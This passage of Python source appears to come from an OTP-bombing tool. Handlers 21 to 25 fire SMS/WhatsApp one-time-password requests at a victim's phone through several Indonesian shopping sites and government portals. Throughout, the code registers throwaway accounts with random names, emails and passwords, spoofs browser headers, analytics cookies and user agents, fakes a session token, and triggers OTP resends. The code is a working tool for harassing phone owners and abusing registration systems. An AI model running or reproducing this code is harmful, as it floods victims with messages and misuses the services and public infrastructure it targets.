        "sec-fetch-dest": "empty",
        "referer": "https://www.beautyhaul.com/account/register",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    })

    try:
        bh_session.post(f"{base}/ajax/account/save_register", json=reg_payload, timeout=12)
    except:
        pass

    otp_payload = {"method": "WhatsApp"}
    try:
        r_otp = bh_session.post(f"{base}/ajax/account/send_otp", json=otp_payload, timeout=12)
        return r_otp
    except Exception as e:
        return None

# ==================== HANDLER 21: HAINAYA ====================
def send_hainaya_otp(phone_for_api):
    register_url = "https://app.hainaya.id/api/onboarding/register"
    
    headers_register = {
        "Host": "app.hainaya.id",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?1",
        "baggage": "sentry-environment=prod,sentry-release=unknown,sentry-public_key=53eae5475dabe364fcfe703020b2de8e,sentry-trace_id=d5c19e89bd4e40c2b2c11fea09653fe0,sentry-org_id=4511251103416320,sentry-sampled=false,sentry-sample_rand=0.30790620208323083,sentry-sample_rate=0.1",
        "sentry-trace": "d5c19e89bd4e40c2b2c11fea09653fe0-8464850c358f140e-0",
        "user-agent": get_random_user_agent(),
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://app.hainaya.id",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.hainaya.id/onboard",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
        "priority": "u=1, i"
    }
    
    prefixes = ['Tst', 'Coba', 'Uji', 'Test', 'Demo', 'Sample', 'Bisnis']
    mid = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
    business_name = random.choice(prefixes) + mid.capitalize() + str(random.randint(10, 999))
    
    register_payload = {
        "business_name": business_name,
        "vertical": "salon",
        "vendor_type": "nail_salon",
        "business_phone": phone_for_api,
        "owner_name": "",
        "owner_phone": phone_for_api
    }
    
    try:
        resp = requests.post(register_url, headers=headers_register, json=register_payload, timeout=15)
        
        if resp.status_code == 201:
            return resp
        
        if resp.status_code == 409:
            login_url = "https://app.hainaya.id/api/auth/login"
            headers_login = {
                "Host": "app.hainaya.id",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?1",
                "baggage": "sentry-environment=prod,sentry-release=unknown,sentry-public_key=53eae5475dabe364fcfe703020b2de8e,sentry-trace_id=3705b296534347ac9c3371f7d40b1c79,sentry-org_id=4511251103416320,sentry-sampled=false,sentry-sample_rand=0.36542800148109433,sentry-sample_rate=0.1",
                "sentry-trace": "3705b296534347ac9c3371f7d40b1c79-90f4f01fb28ef0b8-0",
                "user-agent": get_random_user_agent(),
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "origin": "https://app.hainaya.id",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.hainaya.id/login",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
                "priority": "u=1, i"
            }
            login_payload = {"phone_number": phone_for_api}
            resp_login = requests.post(login_url, headers=headers_login, json=login_payload, timeout=15)
            return resp_login
        
        return resp
        
    except Exception as e:
        return None

# ==================== HANDLER 22: MINUMYUKKAKA ====================
def send_minumyukkaka_otp(phone_08):
    session = requests.Session()
    
    cookies = {
        "currency": "IDR",
        "_gcl_au": f"1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
        "_ga": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
        "_gid": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
        "_fbp": f"fb.1.{int(time.time())}.{random.randint(10000000000000000, 99999999999999999)}",
        "_ga_06QGV7RJ9X": f"GS2.2.s{int(time.time())}$o1$g1$t{int(time.time()+60)}$j7$l0$h0"
    }
    session.cookies.update(cookies)
    
    first_name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
    password = "pass#" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    
    register_url = "https://minumyukkaka.com/services/liquid/Register"
    headers_register = {
        "Host": "minumyukkaka.com",
        "sec-ch-ua-platform": "\"Android\"",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": get_random_user_agent(),
        "accept": "*/*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://minumyukkaka.com",
        "referer": "https://minumyukkaka.com/register",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
    }
    register_data = {
        "registerModel[first_name]": first_name,
        "registerModel[last_name]": "",
        "registerModel[email]": email,
        "registerModel[phone]": phone_08,
        "registerModel[otp]": "",
        "registerModel[gender]": "",
        "registerModel[date_of_birth]": "",
        "registerModel[IsAddressRequired]": "false",
        "registerModel[address]": "",
        "registerModel[additional_address]": "",
        "registerModel[city]": "",
        "registerModel[zip]": "",
        "registerModel[country_code]": "",
        "registerModel[country]": "",
        "registerModel[state]": "",
        "registerModel[password]": password,
        "registerModel[verify_password]": password,
        "registerModel[pin]": "",
        "registerModel[verify_pin]": ""
    }
    
    try:
        session.post(register_url, headers=headers_register, data=register_data, timeout=15)
    except:
        pass
    
    otp_url = "https://minumyukkaka.com/services/identity/requestOTP"
    
    x_sat = session.cookies.get('x-sat')
    if not x_sat:
        x_sat = session.cookies.get('X-SAT')
    if not x_sat:
        x_sat = ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
    
    headers_otp = {
        "Host": "minumyukkaka.com",
        "sec-ch-ua-platform": "\"Android\"",
        "x-sat": x_sat,
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?1",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": get_random_user_agent(),
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://minumyukkaka.com",
        "referer": "https://minumyukkaka.com/register",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
    }
    otp_data = {
        "destination": phone_08,
        "otpLength": "6"
    }
    
    try:
        resp = session.post(otp_url, headers=headers_otp, data=otp_data, timeout=15)
        return resp
    except:
        return None

# ==================== HANDLER 23: SIDEMANG PALEMBANG ====================
def send_sidemang_otp(phone_08):
    email_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    email = f"{email_name}{random.randint(100, 999)}@gmail.com"
    
    url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
    
    headers = {
        "Host": "sidemang.palembang.go.id",
        "sec-ch-ua-platform": "\"Android\"",
        "user-agent": get_random_user_agent(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://sidemang.palembang.go.id",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://sidemang.palembang.go.id/lambidaro/register-otp",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
        "priority": "u=1, i"
    }
    
    cookies = {
        "_ga": f"GA1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
        "_ga_0Q2HYJNQP5": f"GS2.1.s{int(time.time())}$o1$g1$t{int(time.time()+60)}$j47$l0$h0"
    }
    
    payload = {
        "phoneNumber": phone_08,
        "email": email
    }
    
    try:
        resp = requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=15)
        return resp
    except:
        return None

# ==================== HANDLER 24: LAPORMASBUP KLATEN ====================
_registered_phones = {}

def send_lapormasbup_otp(phone_08):
    global _registered_phones
    
    if phone_08 in _registered_phones:
        url = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"
        headers = {
            "Host": "lapormasbup.klaten.go.id",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": get_random_user_agent(),
            "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            "Content-Type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "Accept": "*/*",
            "Origin": "https://lapormasbup.klaten.go.id",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://lapormasbup.klaten.go.id/confirm_otp",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
        }
        payload = {"mobilephone": phone_08}
        try:
            resp = requests.post(url, headers=headers, json=payload, timeout=15)
            return resp, True
        except:
            return None, True
    
    name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
    password = "Pass" + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "$"
    birth_date = f"{random.randint(1966, 2010)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"
    address = f"Jl. {''.join(random.choices(string.ascii_letters, k=6)).capitalize()} No. {random.randint(1, 200)}"
    gender = random.choice(['Laki-Laki', 'Perempuan'])
    
    url = "https://lapormasbup.klaten.go.id/api/register"
    headers = {
        "Host": "lapormasbup.klaten.go.id",
        "sec-ch-ua-platform": "\"Android\"",
        "User-Agent": get_random_user_agent(),
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "Accept": "*/*",
        "Origin": "https://lapormasbup.klaten.go.id",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://lapormasbup.klaten.go.id/registrasi",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
    }
    payload = {
        "name": name,
        "email": email,
        "mobilephone": phone_08,
        "gender": gender,
        "warga_birth_date": birth_date,
        "password": password,
        "address": address
    }
    
    try:
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        if resp.status_code == 200:
            try:
                data = resp.json()
                if 'user' in data and 'warga_id' in data['user']:
                    _registered_phones[phone_08] = True
            except:
                pass
        elif resp.status_code == 400:
            try:
                data = resp.json()
                if 'verifikasi' in data.get('error', '').lower():
                    _registered_phones[phone_08] = True
                    resend_resp, _ = send_lapormasbup_otp(phone_08)
                    return resend_resp, True
            except:
                pass
        return resp, False
    except:
        return None, False

# ==================== HANDLER 25: PTSP KEMENAG ====================
def send_ptsp_kemenag_otp(phone_08):
    name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
    
    letters = ''.join(random.choices(string.ascii_letters, k=6))
    digits = ''.join(random.choices(string.digits, k=2))
    chars = list(letters + digits)
    random.shuffle(chars)
    password = 'Pass' + ''.join(chars) + '$'
    
    url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
    
    headers = {
        "Host": "dev-ptsp.kemenag.go.id",
        "sec-ch-ua-platform": "\"Android\"",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://dev-ptsp.kemenag.go.id",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://dev-ptsp.kemenag.go.id/login",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
    }
    
    cookies = {
        "cookiesession1": ''.join(random.choices(string.hexdigits.upper(), k=32))
    }
    
    payload = {
        "nama": name,
        "wa": phone_08,
        "email": email,
        "password": password
    }
    
    try:
        resp = requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=15)
        return resp
    except:
        return None
